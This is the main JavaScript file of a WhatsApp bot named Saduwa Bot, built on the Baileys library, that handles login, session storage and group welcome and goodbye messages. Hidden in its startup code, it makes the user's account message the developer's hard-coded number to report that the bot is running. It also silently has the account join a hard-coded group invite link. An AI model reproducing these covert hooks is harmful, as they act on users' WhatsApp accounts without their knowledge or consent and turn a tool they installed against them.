//pls give credit if you reupload 
//or copy the codes
//© 2022 Saduwa Bot Inc. Ds Bot
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
const { color } = require('./lib/color.js')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))

session = setting.session


require('./SaduwaBot.js')
nocache('./SaduwaBot.js', module => console.log(`${module} telah di update!`))

const starts = async (Saduwa = new WAConnection()) => {
    Saduwa.logger.level = 'warn'
    Saduwa.version = [2, 2142, 12]
    console.log(color(figlet.textSync('Saduwa', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> YT CHANNEL: Saduwa YT ','silver'))
console.log(color('> GITHUB: Saduwa ','silver'))
console.log(color('> WA NUMBER: +94761905764 ','silver'))
console.log(color('  Saduwa Bot Inc. 2022','mediumseagreen'))
    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/94761905764'))
    console.log(color('[SADUWA-BOT]'), color('Saduwa Bot Is Online', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
    console.log(color('<>','red'), color('Thanks For Using Saduwa Bot', 'white'))
	Saduwa.browserDescription = [ 'Dark Saduwa', 'chrome', '3.0' ]
    Saduwa.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
    })

    fs.existsSync(`./${session}.json`) && Saduwa.loadAuthInfo(`./${session}.json`)
    Saduwa.on('connecting', () => {
        start('2', 'Loading ...')
    })
    Saduwa.on('open', () => {
        success('2', 'Connected ✓')
    })
        //inform to developer that the user is connected to bot
    Saduwa.sendMessage(`94761905764@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
    
    //group link target
    teks = `https://chat.whatsapp.com/KTugUgiUfST3w9ix6RnEdU`
    Saduwa.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
    await Saduwa.connect({timeoutMs: 30*1000})
        fs.writeFileSync(`./${session}.json`, JSON.stringify(Saduwa.base64EncodedAuthInfo(), null, '\t'))

    Saduwa.on('chat-update', async (message) => {
        require('./SaduwaBot.js')(Saduwa, message, _welkom)
    })
Saduwa.on("group-participants-update", async (anu) => {

    const isWelkom = _welkom.includes(anu.jid)
    try {
      groupMet = await Saduwa.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
      groupAdmins = getGroupAdmins(groupMembers)
      mem = anu.participants[0]

      console.log(anu)
      try {
        pp_user = await Saduwa.getProfilePicture(mem)
      } catch (e) {
        pp_user = "https://telegra.ph/file/850ac563c531954b91020.jpg7"
      }
      try {
        pp_group = await Saduwa.getProfilePicture(anu.jid)
      } catch (e) {
        pp_group =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
      }
            if (anu.action == "add" && mem.includes(Saduwa.user.jid)) {
        Saduwa.sendMessage(anu.jid, "Hello, I'm Dark-Saduwa Whatsapp Bot㋡︎", "conversation")
      }
      buffer = await getBuffer(pp_user)
      if (anu.action == 'add' && !mem.includes(Saduwa.user.jid)) {
      const mdata = await Saduwa.groupMetadata(anu.jid)
      const memeg = mdata.participants.length
      const thu = await Saduwa.getStatus(anu.participants[0], MessageType.text)
      const num = anu.participants[0]
      const bosco1 = await Saduwa.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
      let v = Saduwa.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = v.vname || v.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      teks = ` ⛧〽️  𝙃𝙞 _*@${num.split('@')[0]}*_ \n ⛧〽️  Bɪᴏ : _*${thu.status}*_ \n ⛧〽️  Mᴇᴍʙᴇʀs : _*${memeg}*_ \n ⛧〽️  Wᴇʟᴄᴏᴍᴇ Tᴏ _*${mdata.subject}*_\n ⛧〽️  ᴅᴏɴᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ʀᴇᴀᴅ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ`
      welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
      welcomeButt = { contentText: `${teks}`, footerText: `*©𝙳𝙰𝚁𝙺 𝚂𝙰𝙳𝚄𝚆𝙰 𝙱𝙾𝚃*`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
      Saduwa.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
      if (anu.action == 'remove' && !mem.includes(Saduwa.user.jid)) {
      const mdata = await Saduwa.groupMetadata(anu.jid)
      const num = anu.participants[0]
      const bosco3 = await Saduwa.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
      let w = Saduwa.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = w.vname || w.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      memeg = mdata.participants.length
      out = ` ⛧〽️  සුබ ගමන් _*@${num.split('@')[0]}*_\n ⛧〽️  *කණගාටුයි, එක් අයෙකු සමූහයෙන් පිටත්වූවා*`
      goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'BYE 👋'},type:1}, {buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'}, type:1}]
      goodbyeButt = { contentText: `${out}`, footerText: `*©𝙳𝙰𝚁𝙺 𝚂𝙰𝙳𝚄𝚆𝙰 𝙱𝙾𝚃*`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
      Saduwa.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }

  })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'Now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
